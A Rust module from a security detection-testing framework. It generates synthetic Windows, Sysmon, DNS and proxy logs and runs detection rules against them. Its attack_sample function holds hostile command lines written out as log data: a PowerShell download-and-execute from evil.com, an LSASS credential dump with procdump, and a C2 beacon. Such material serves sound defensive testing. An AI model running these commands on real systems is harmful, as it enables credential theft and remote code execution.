//! Detection Testing Framework
//!
//! This module provides:
//! - Test cases for detections
//! - Sample log generation for testing
//! - Expected vs actual results comparison
//! - Automated regression testing
//! - Test coverage metrics

use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use uuid::Uuid;

use super::detections::{Detection, DetectionSeverity};

/// Type of detection test
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum TestType {
    /// Unit test - tests detection logic in isolation
    Unit,
    /// Integration test - tests with real log sources
    Integration,
    /// Regression test - tests for previously fixed issues
    Regression,
    /// Performance test - measures detection speed
    Performance,
    /// Coverage test - verifies technique coverage
    Coverage,
    /// Validation test - validates detection syntax
    Validation,
}

impl std::fmt::Display for TestType {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Unit => write!(f, "unit"),
            Self::Integration => write!(f, "integration"),
            Self::Regression => write!(f, "regression"),
            Self::Performance => write!(f, "performance"),
            Self::Coverage => write!(f, "coverage"),
            Self::Validation => write!(f, "validation"),
        }
    }
}

impl std::str::FromStr for TestType {
    type Err = String;

    fn from_str(s: &str) -> Result<Self, Self::Err> {
        match s.to_lowercase().as_str() {
            "unit" => Ok(Self::Unit),
            "integration" => Ok(Self::Integration),
            "regression" => Ok(Self::Regression),
            "performance" => Ok(Self::Performance),
            "coverage" => Ok(Self::Coverage),
            "validation" => Ok(Self::Validation),
            _ => Err(format!("Unknown test type: {}", s)),
        }
    }
}

/// Test case for a detection
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DetectionTest {
    /// Unique test ID
    pub id: String,
    /// Detection ID being tested
    pub detection_id: String,
    /// Test name
    pub name: String,
    /// Test description
    pub description: Option<String>,
    /// Type of test
    pub test_type: TestType,
    /// Input logs (JSON array)
    pub input_logs: Vec<serde_json::Value>,
    /// Expected result
    pub expected_result: ExpectedResult,
    /// Test priority
    pub priority: TestPriority,
    /// Tags for categorization
    pub tags: Vec<String>,
    /// Whether test is enabled
    pub enabled: bool,
    /// Created by
    pub created_by: String,
    /// Created at
    pub created_at: DateTime<Utc>,
    /// Updated at
    pub updated_at: DateTime<Utc>,
}

/// Expected result of a test
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ExpectedResult {
    /// Should the detection fire?
    pub should_alert: bool,
    /// Expected number of alerts (if should_alert is true)
    pub alert_count: Option<u32>,
    /// Expected severity (optional validation)
    pub severity: Option<DetectionSeverity>,
    /// Expected fields in the alert
    pub expected_fields: Option<HashMap<String, serde_json::Value>>,
    /// Partial field matches (regex patterns)
    pub field_patterns: Option<HashMap<String, String>>,
    /// Maximum execution time in milliseconds (for performance tests)
    pub max_execution_ms: Option<u64>,
}

/// Test priority
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum TestPriority {
    Critical,
    High,
    Medium,
    Low,
}

impl Default for TestPriority {
    fn default() -> Self {
        Self::Medium
    }
}

impl std::fmt::Display for TestPriority {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Critical => write!(f, "critical"),
            Self::High => write!(f, "high"),
            Self::Medium => write!(f, "medium"),
            Self::Low => write!(f, "low"),
        }
    }
}

impl std::str::FromStr for TestPriority {
    type Err = String;

    fn from_str(s: &str) -> Result<Self, Self::Err> {
        match s.to_lowercase().as_str() {
            "critical" => Ok(Self::Critical),
            "high" => Ok(Self::High),
            "medium" => Ok(Self::Medium),
            "low" => Ok(Self::Low),
            _ => Err(format!("Unknown test priority: {}", s)),
        }
    }
}

/// Result of a single test case
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TestCase {
    /// Test case ID
    pub id: String,
    /// Test ID this case belongs to
    pub test_id: String,
    /// Case name
    pub name: String,
    /// Input data
    pub input: serde_json::Value,
    /// Expected output
    pub expected: ExpectedResult,
    /// Order in test sequence
    pub order: u32,
}

/// Result of running a test
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TestResult {
    /// Whether the test passed
    pub passed: bool,
    /// Actual alerts generated
    pub actual_alerts: Vec<serde_json::Value>,
    /// Actual alert count
    pub actual_alert_count: u32,
    /// Whether the detection fired
    pub did_alert: bool,
    /// Execution time in milliseconds
    pub execution_time_ms: u64,
    /// Failure reason (if failed)
    pub failure_reason: Option<String>,
    /// Field comparison results
    pub field_comparisons: Vec<FieldComparison>,
    /// Additional details
    pub details: Option<String>,
}

/// Field comparison result
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FieldComparison {
    /// Field name
    pub field: String,
    /// Expected value
    pub expected: Option<String>,
    /// Actual value
    pub actual: Option<String>,
    /// Whether they matched
    pub matched: bool,
}

/// Record of a test run
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TestRun {
    /// Unique run ID
    pub id: String,
    /// Test ID that was run
    pub test_id: String,
    /// Detection ID tested
    pub detection_id: String,
    /// Result of the test
    pub result: TestResult,
    /// Detection version used
    pub detection_version: u32,
    /// When the test ran
    pub run_at: DateTime<Utc>,
    /// Who triggered the run
    pub triggered_by: Option<String>,
    /// Environment (dev, staging, prod)
    pub environment: String,
}

/// Test suite containing multiple tests
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TestSuite {
    /// Suite ID
    pub id: String,
    /// Suite name
    pub name: String,
    /// Suite description
    pub description: Option<String>,
    /// Tests in this suite
    pub test_ids: Vec<String>,
    /// Created by
    pub created_by: String,
    /// Created at
    pub created_at: DateTime<Utc>,
}

/// Summary of test results for a detection
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TestSummary {
    /// Detection ID
    pub detection_id: String,
    /// Total tests
    pub total_tests: u32,
    /// Passed tests
    pub passed: u32,
    /// Failed tests
    pub failed: u32,
    /// Skipped tests
    pub skipped: u32,
    /// Pass rate (0-100)
    pub pass_rate: f64,
    /// Last run timestamp
    pub last_run: Option<DateTime<Utc>>,
    /// Coverage score (0-100)
    pub coverage_score: f64,
    /// Failed test IDs
    pub failed_tests: Vec<String>,
}

/// Test coverage metrics
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TestCoverageMetrics {
    /// Total detections
    pub total_detections: u32,
    /// Detections with tests
    pub detections_with_tests: u32,
    /// Total tests
    pub total_tests: u32,
    /// Tests by type
    pub tests_by_type: HashMap<String, u32>,
    /// Average tests per detection
    pub avg_tests_per_detection: f64,
    /// Coverage percentage
    pub coverage_percentage: f64,
    /// Detections without tests
    pub untested_detections: Vec<String>,
}

/// Sample log generator for testing
pub struct SampleLogGenerator;

impl SampleLogGenerator {
    /// Generate Windows Security log sample
    pub fn windows_security_log(event_id: u32, username: &str, hostname: &str) -> serde_json::Value {
        serde_json::json!({
            "EventID": event_id,
            "TimeCreated": Utc::now().to_rfc3339(),
            "Computer": hostname,
            "Channel": "Security",
            "Provider": "Microsoft-Windows-Security-Auditing",
            "EventData": {
                "SubjectUserName": username,
                "SubjectDomainName": "DOMAIN",
                "SubjectLogonId": "0x12345",
                "TargetUserName": username,
                "TargetDomainName": "DOMAIN",
                "LogonType": 10,
                "IpAddress": "192.168.1.100",
                "IpPort": 49154,
                "WorkstationName": hostname
            }
        })
    }

    /// Generate Sysmon Process Creation log (Event ID 1)
    pub fn sysmon_process_creation(
        process_name: &str,
        command_line: &str,
        parent_process: &str,
        user: &str,
    ) -> serde_json::Value {
        serde_json::json!({
            "EventID": 1,
            "TimeCreated": Utc::now().to_rfc3339(),
            "Channel": "Microsoft-Windows-Sysmon/Operational",
            "Computer": "WORKSTATION01",
            "EventData": {
                "UtcTime": Utc::now().format("%Y-%m-%d %H:%M:%S.%3f").to_string(),
                "ProcessGuid": format!("{{{}}}", Uuid::new_v4()),
                "ProcessId": 1234,
                "Image": process_name,
                "CommandLine": command_line,
                "CurrentDirectory": "C:\\Users\\user\\",
                "User": user,
                "LogonGuid": format!("{{{}}}", Uuid::new_v4()),
                "LogonId": "0x12345",
                "TerminalSessionId": 1,
                "IntegrityLevel": "Medium",
                "Hashes": "SHA256=ABCDEF1234567890",
                "ParentProcessGuid": format!("{{{}}}", Uuid::new_v4()),
                "ParentProcessId": 5678,
                "ParentImage": parent_process,
                "ParentCommandLine": parent_process,
                "ParentUser": user
            }
        })
    }

    /// Generate Sysmon Network Connection log (Event ID 3)
    pub fn sysmon_network_connection(
        process_name: &str,
        dest_ip: &str,
        dest_port: u16,
        initiated: bool,
    ) -> serde_json::Value {
        serde_json::json!({
            "EventID": 3,
            "TimeCreated": Utc::now().to_rfc3339(),
            "Channel": "Microsoft-Windows-Sysmon/Operational",
            "Computer": "WORKSTATION01",
            "EventData": {
                "UtcTime": Utc::now().format("%Y-%m-%d %H:%M:%S.%3f").to_string(),
                "ProcessGuid": format!("{{{}}}", Uuid::new_v4()),
                "ProcessId": 1234,
                "Image": process_name,
                "User": "DOMAIN\\user",
                "Protocol": "tcp",
                "Initiated": initiated,
                "SourceIsIpv6": false,
                "SourceIp": "192.168.1.100",
                "SourceHostname": "workstation01.domain.local",
                "SourcePort": 49154,
                "DestinationIsIpv6": false,
                "DestinationIp": dest_ip,
                "DestinationHostname": "",
                "DestinationPort": dest_port
            }
        })
    }

    /// Generate PowerShell Script Block Logging (Event ID 4104)
    pub fn powershell_script_block(script_content: &str, script_path: Option<&str>) -> serde_json::Value {
        serde_json::json!({
            "EventID": 4104,
            "TimeCreated": Utc::now().to_rfc3339(),
            "Channel": "Microsoft-Windows-PowerShell/Operational",
            "Computer": "WORKSTATION01",
            "EventData": {
                "MessageNumber": 1,
                "MessageTotal": 1,
                "ScriptBlockText": script_content,
                "ScriptBlockId": Uuid::new_v4().to_string(),
                "Path": script_path.unwrap_or("")
            }
        })
    }

    /// Generate Windows Registry modification (Sysmon Event ID 13)
    pub fn sysmon_registry_value_set(
        process_name: &str,
        target_object: &str,
        details: &str,
    ) -> serde_json::Value {
        serde_json::json!({
            "EventID": 13,
            "TimeCreated": Utc::now().to_rfc3339(),
            "Channel": "Microsoft-Windows-Sysmon/Operational",
            "Computer": "WORKSTATION01",
            "EventData": {
                "UtcTime": Utc::now().format("%Y-%m-%d %H:%M:%S.%3f").to_string(),
                "ProcessGuid": format!("{{{}}}", Uuid::new_v4()),
                "ProcessId": 1234,
                "Image": process_name,
                "TargetObject": target_object,
                "Details": details,
                "User": "DOMAIN\\user"
            }
        })
    }

    /// Generate DNS query log
    pub fn dns_query(query_name: &str, query_type: &str, client_ip: &str) -> serde_json::Value {
        serde_json::json!({
            "timestamp": Utc::now().to_rfc3339(),
            "source": "dns_server",
            "query": {
                "name": query_name,
                "type": query_type,
                "class": "IN"
            },
            "client": {
                "ip": client_ip,
                "port": 12345
            },
            "response": {
                "code": "NOERROR",
                "answers": []
            }
        })
    }

    /// Generate HTTP/Web proxy log
    pub fn http_request(
        method: &str,
        url: &str,
        user_agent: &str,
        client_ip: &str,
        response_code: u16,
    ) -> serde_json::Value {
        serde_json::json!({
            "timestamp": Utc::now().to_rfc3339(),
            "source": "proxy",
            "http": {
                "request": {
                    "method": method,
                    "url": url,
                    "headers": {
                        "User-Agent": user_agent,
                        "Host": "example.com"
                    }
                },
                "response": {
                    "status_code": response_code,
                    "bytes": 1234
                }
            },
            "client": {
                "ip": client_ip,
                "user": "user@domain.com"
            }
        })
    }

    /// Generate authentication log
    pub fn authentication_log(
        username: &str,
        success: bool,
        source_ip: &str,
        auth_type: &str,
    ) -> serde_json::Value {
        serde_json::json!({
            "timestamp": Utc::now().to_rfc3339(),
            "event_type": "authentication",
            "user": username,
            "success": success,
            "source_ip": source_ip,
            "auth_type": auth_type,
            "failure_reason": if success { serde_json::Value::Null } else { serde_json::json!("invalid_password") },
            "destination": {
                "ip": "10.0.0.1",
                "port": 443,
                "service": "web_app"
            }
        })
    }

    /// Generate malicious sample logs for common attack techniques
    pub fn attack_sample(technique_id: &str) -> Vec<serde_json::Value> {
        match technique_id {
            "T1059.001" => {
                // PowerShell execution
                vec![
                    Self::sysmon_process_creation(
                        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                        "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload')\"",
                        "C:\\Windows\\System32\\cmd.exe",
                        "DOMAIN\\victim",
                    ),
                    Self::powershell_script_block(
                        "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload')",
                        None,
                    ),
                ]
            }
            "T1003.001" => {
                // LSASS credential dumping
                vec![
                    Self::sysmon_process_creation(
                        "C:\\Windows\\Temp\\procdump64.exe",
                        "procdump64.exe -accepteula -ma lsass.exe lsass.dmp",
                        "C:\\Windows\\System32\\cmd.exe",
                        "NT AUTHORITY\\SYSTEM",
                    ),
                ]
            }
            "T1547.001" => {
                // Registry Run Keys persistence
                vec![
                    Self::sysmon_registry_value_set(
                        "C:\\Windows\\Temp\\malware.exe",
                        "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Malware",
                        "C:\\Windows\\Temp\\malware.exe",
                    ),
                ]
            }
            "T1071.001" => {
                // HTTP C2 communication
                vec![
                    Self::sysmon_network_connection(
                        "C:\\Windows\\System32\\rundll32.exe",
                        "185.199.110.133",
                        443,
                        true,
                    ),
                    Self::http_request(
                        "POST",
                        "https://c2.evil.com/beacon",
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                        "192.168.1.100",
                        200,
                    ),
                ]
            }
            "T1110" => {
                // Brute force authentication
                vec![
                    Self::authentication_log("admin", false, "10.0.0.50", "password"),
                    Self::authentication_log("admin", false, "10.0.0.50", "password"),
                    Self::authentication_log("admin", false, "10.0.0.50", "password"),
                    Self::authentication_log("admin", false, "10.0.0.50", "password"),
                    Self::authentication_log("admin", false, "10.0.0.50", "password"),
                ]
            }
            _ => vec![],
        }
    }

    /// Generate benign sample logs (for FP testing)
    pub fn benign_sample(sample_type: &str) -> Vec<serde_json::Value> {
        match sample_type {
            "admin_powershell" => {
                vec![
                    Self::sysmon_process_creation(
                        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                        "powershell.exe -Command Get-Process",
                        "C:\\Windows\\explorer.exe",
                        "DOMAIN\\admin",
                    ),
                ]
            }
            "legitimate_network" => {
                vec![
                    Self::sysmon_network_connection(
                        "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe",
                        "13.107.42.14",
                        443,
                        true,
                    ),
                ]
            }
            "scheduled_task" => {
                vec![
                    Self::sysmon_process_creation(
                        "C:\\Windows\\System32\\schtasks.exe",
                        "schtasks.exe /query",
                        "C:\\Windows\\System32\\cmd.exe",
                        "DOMAIN\\admin",
                    ),
                ]
            }
            _ => vec![],
        }
    }
}

/// Test executor for running detection tests
pub struct TestExecutor {
    /// Detection being tested
    detection: Detection,
}

impl TestExecutor {
    pub fn new(detection: Detection) -> Self {
        Self { detection }
    }

    /// Run a single test
    pub fn run_test(&self, test: &DetectionTest) -> TestResult {
        let start = std::time::Instant::now();

        // For now, we'll implement a simple pattern-based matching
        // In a real implementation, this would integrate with the actual detection engine
        let alerts = self.evaluate_logs(&test.input_logs);
        let execution_time = start.elapsed().as_millis() as u64;

        let did_alert = !alerts.is_empty();
        let actual_count = alerts.len() as u32;

        let mut failure_reason = None;
        let mut passed = true;

        // Check if alert behavior matches expected
        if test.expected_result.should_alert != did_alert {
            passed = false;
            failure_reason = Some(format!(
                "Expected {} but got {}",
                if test.expected_result.should_alert { "alert" } else { "no alert" },
                if did_alert { "alert" } else { "no alert" }
            ));
        }

        // Check alert count if specified
        if passed {
            if let Some(expected_count) = test.expected_result.alert_count {
                if expected_count != actual_count {
                    passed = false;
                    failure_reason = Some(format!(
                        "Expected {} alerts but got {}",
                        expected_count, actual_count
                    ));
                }
            }
        }

        // Check execution time for performance tests
        if passed && test.test_type == TestType::Performance {
            if let Some(max_ms) = test.expected_result.max_execution_ms {
                if execution_time > max_ms {
                    passed = false;
                    failure_reason = Some(format!(
                        "Execution time {}ms exceeded maximum {}ms",
                        execution_time, max_ms
                    ));
                }
            }
        }

        // Field comparisons
        let field_comparisons = self.compare_fields(&alerts, &test.expected_result);
        if !field_comparisons.iter().all(|f| f.matched) {
            passed = false;
            if failure_reason.is_none() {
                let failed_fields: Vec<_> = field_comparisons.iter()
                    .filter(|f| !f.matched)
                    .map(|f| f.field.as_str())
                    .collect();
                failure_reason = Some(format!("Field mismatches: {:?}", failed_fields));
            }
        }

        TestResult {
            passed,
            actual_alerts: alerts,
            actual_alert_count: actual_count,
            did_alert,
            execution_time_ms: execution_time,
            failure_reason,
            field_comparisons,
            details: None,
        }
    }

    /// Run all tests for the detection
    pub fn run_all(&self, tests: &[DetectionTest]) -> Vec<TestRun> {
        tests.iter()
            .filter(|t| t.enabled)
            .map(|test| {
                let result = self.run_test(test);
                TestRun {
                    id: Uuid::new_v4().to_string(),
                    test_id: test.id.clone(),
                    detection_id: self.detection.id.clone(),
                    result,
                    detection_version: self.detection.version,
                    run_at: Utc::now(),
                    triggered_by: None,
                    environment: "test".to_string(),
                }
            })
            .collect()
    }

    /// Evaluate logs against detection logic
    fn evaluate_logs(&self, logs: &[serde_json::Value]) -> Vec<serde_json::Value> {
        let mut alerts = Vec::new();

        // Simple pattern matching based on detection query
        // This is a simplified implementation - real one would use actual detection engine
        let query = &self.detection.logic.query;

        for log in logs {
            if self.matches_query(log, query) {
                alerts.push(serde_json::json!({
                    "detection_id": self.detection.id,
                    "detection_name": self.detection.name,
                    "severity": self.detection.severity.to_string(),
                    "timestamp": Utc::now().to_rfc3339(),
                    "matched_log": log,
                }));
            }
        }

        alerts
    }

    /// Simple query matching (basic implementation)
    fn matches_query(&self, log: &serde_json::Value, query: &str) -> bool {
        // Parse simple field:value patterns
        for part in query.split_whitespace() {
            if let Some((field, value)) = part.split_once(':') {
                let field = field.trim();
                let value = value.trim().trim_matches('"');

                // Check if log contains this field:value
                if !self.field_matches(log, field, value) {
                    return false;
                }
            }
        }
        true
    }

    /// Check if a field in the log matches the expected value
    fn field_matches(&self, log: &serde_json::Value, field: &str, expected: &str) -> bool {
        // Handle nested fields (e.g., EventData.Image)
        let parts: Vec<&str> = field.split('.').collect();
        let mut current = log;

        for part in &parts {
            match current.get(part) {
                Some(v) => current = v,
                None => return false,
            }
        }

        // Compare value
        if let Some(actual) = current.as_str() {
            // Support wildcards
            if expected.contains('*') {
                let pattern = expected.replace('*', ".*");
                return regex::Regex::new(&pattern)
                    .map(|re| re.is_match(actual))
                    .unwrap_or(false);
            }
            return actual == expected;
        }

        // Handle numeric comparisons
        if let Some(actual_num) = current.as_i64() {
            if let Ok(expected_num) = expected.parse::<i64>() {
                return actual_num == expected_num;
            }
        }

        false
    }

    /// Compare alert fields with expected values
    fn compare_fields(
        &self,
        alerts: &[serde_json::Value],
        expected: &ExpectedResult,
    ) -> Vec<FieldComparison> {
        let mut comparisons = Vec::new();

        if let Some(ref expected_fields) = expected.expected_fields {
            for (field, expected_value) in expected_fields {
                let actual_value = alerts.first()
                    .and_then(|a| a.get("matched_log"))
                    .and_then(|log| {
                        let parts: Vec<&str> = field.split('.').collect();
                        let mut current = log;
                        for part in &parts {
                            current = current.get(part)?;
                        }
                        Some(current.to_string())
                    });

                let matched = actual_value.as_ref()
                    .map(|av| av == &expected_value.to_string())
                    .unwrap_or(false);

                comparisons.push(FieldComparison {
                    field: field.clone(),
                    expected: Some(expected_value.to_string()),
                    actual: actual_value,
                    matched,
                });
            }
        }

        comparisons
    }

    /// Calculate test summary
    pub fn summarize(runs: &[TestRun], detection_id: &str) -> TestSummary {
        let detection_runs: Vec<_> = runs.iter()
            .filter(|r| r.detection_id == detection_id)
            .collect();

        let total = detection_runs.len() as u32;
        let passed = detection_runs.iter().filter(|r| r.result.passed).count() as u32;
        let failed = total - passed;
        let pass_rate = if total > 0 {
            (passed as f64 / total as f64) * 100.0
        } else {
            0.0
        };

        let last_run = detection_runs.iter()
            .map(|r| r.run_at)
            .max();

        let failed_tests: Vec<_> = detection_runs.iter()
            .filter(|r| !r.result.passed)
            .map(|r| r.test_id.clone())
            .collect();

        TestSummary {
            detection_id: detection_id.to_string(),
            total_tests: total,
            passed,
            failed,
            skipped: 0,
            pass_rate,
            last_run,
            coverage_score: pass_rate, // Simplified
            failed_tests,
        }
    }
}

/// Calculate overall test coverage metrics
pub fn calculate_coverage_metrics(
    detections: &[Detection],
    tests: &[DetectionTest],
) -> TestCoverageMetrics {
    let total_detections = detections.len() as u32;

    let detection_ids_with_tests: std::collections::HashSet<_> = tests.iter()
        .map(|t| &t.detection_id)
        .collect();

    let detections_with_tests = detection_ids_with_tests.len() as u32;

    let total_tests = tests.len() as u32;

    let mut tests_by_type: HashMap<String, u32> = HashMap::new();
    for test in tests {
        *tests_by_type.entry(test.test_type.to_string()).or_insert(0) += 1;
    }

    let avg_tests_per_detection = if total_detections > 0 {
        total_tests as f64 / total_detections as f64
    } else {
        0.0
    };

    let coverage_percentage = if total_detections > 0 {
        (detections_with_tests as f64 / total_detections as f64) * 100.0
    } else {
        0.0
    };

    let untested_detections: Vec<_> = detections.iter()
        .filter(|d| !detection_ids_with_tests.contains(&d.id))
        .map(|d| d.id.clone())
        .collect();

    TestCoverageMetrics {
        total_detections,
        detections_with_tests,
        total_tests,
        tests_by_type,
        avg_tests_per_detection,
        coverage_percentage,
        untested_detections,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::detection_engineering::detections::{Detection, DetectionLogic, DetectionMetadata};
    use std::collections::HashMap;

    fn create_test_detection() -> Detection {
        let now = Utc::now();
        Detection {
            id: "DET-001".to_string(),
            name: "PowerShell Execution".to_string(),
            description: "Detects PowerShell execution".to_string(),
            severity: DetectionSeverity::Medium,
            status: super::super::detections::DetectionStatus::Production,
            logic: DetectionLogic {
                language: "simple".to_string(),
                query: "EventID:1 Image:*powershell.exe*".to_string(),
                field_mappings: HashMap::new(),
                aggregation: None,
                threshold: None,
                timeframe: None,
                condition: None,
            },
            data_sources: Vec::new(),
            mitre_techniques: vec!["T1059.001".to_string()],
            mitre_tactics: vec!["TA0002".to_string()],
            metadata: DetectionMetadata {
                author: "Test".to_string(),
                author_email: None,
                created_at: now,
                updated_at: now,
                references: Vec::new(),
                related_detections: Vec::new(),
                tags: Vec::new(),
                license: None,
                source: None,
            },
            version: 1,
            fp_rate: None,
            confidence: None,
            enabled: true,
        }
    }

    #[test]
    fn test_sample_log_generation() {
        let log = SampleLogGenerator::sysmon_process_creation(
            "powershell.exe",
            "powershell.exe -Command Get-Process",
            "cmd.exe",
            "user",
        );

        assert_eq!(log["EventID"], 1);
        assert!(log["EventData"]["Image"].as_str().unwrap().contains("powershell"));
    }

    #[test]
    fn test_attack_samples() {
        let samples = SampleLogGenerator::attack_sample("T1059.001");
        assert!(!samples.is_empty());

        let samples = SampleLogGenerator::attack_sample("T1003.001");
        assert!(!samples.is_empty());
    }

    #[test]
    fn test_test_execution() {
        let detection = create_test_detection();
        let executor = TestExecutor::new(detection);

        let test = DetectionTest {
            id: "TEST-001".to_string(),
            detection_id: "DET-001".to_string(),
            name: "Test PowerShell detection".to_string(),
            description: None,
            test_type: TestType::Unit,
            input_logs: vec![
                SampleLogGenerator::sysmon_process_creation(
                    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "powershell.exe -Command Get-Process",
                    "cmd.exe",
                    "user",
                ),
            ],
            expected_result: ExpectedResult {
                should_alert: true,
                alert_count: Some(1),
                severity: None,
                expected_fields: None,
                field_patterns: None,
                max_execution_ms: None,
            },
            priority: TestPriority::Medium,
            tags: Vec::new(),
            enabled: true,
            created_by: "test".to_string(),
            created_at: Utc::now(),
            updated_at: Utc::now(),
        };

        let result = executor.run_test(&test);
        assert!(result.did_alert);
    }

    #[test]
    fn test_coverage_metrics() {
        let detections = vec![create_test_detection()];
        let tests = vec![
            DetectionTest {
                id: "TEST-001".to_string(),
                detection_id: "DET-001".to_string(),
                name: "Test".to_string(),
                description: None,
                test_type: TestType::Unit,
                input_logs: Vec::new(),
                expected_result: ExpectedResult {
                    should_alert: true,
                    alert_count: None,
                    severity: None,
                    expected_fields: None,
                    field_patterns: None,
                    max_execution_ms: None,
                },
                priority: TestPriority::Medium,
                tags: Vec::new(),
                enabled: true,
                created_by: "test".to_string(),
                created_at: Utc::now(),
                updated_at: Utc::now(),
            },
        ];

        let metrics = calculate_coverage_metrics(&detections, &tests);
        assert_eq!(metrics.total_detections, 1);
        assert_eq!(metrics.detections_with_tests, 1);
        assert_eq!(metrics.coverage_percentage, 100.0);
    }
}
